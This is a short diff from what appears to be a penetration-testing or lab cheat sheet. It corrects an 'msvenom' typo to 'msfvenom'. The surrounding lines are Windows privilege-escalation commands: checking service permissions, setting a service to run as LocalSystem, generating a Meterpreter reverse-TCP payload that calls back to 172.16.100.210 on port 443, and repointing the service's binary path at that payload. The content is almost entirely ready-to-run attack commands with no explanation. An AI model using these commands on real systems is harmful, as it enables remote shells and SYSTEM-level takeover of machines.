@@ -20,7 +20,7 @@ acesschk.exe -uqmv .\tyranus-op
 
 sc config raxus-service obj=".\LocalSystem"
 
-msvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.100.210 lport=443 -f exe -o invasao.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.100.210 lport=443 -f exe -o invasao.exe
 sc config raxus-service binpath="C:\users\tyranus-op\invasao.exe"
 
 service postgresql start
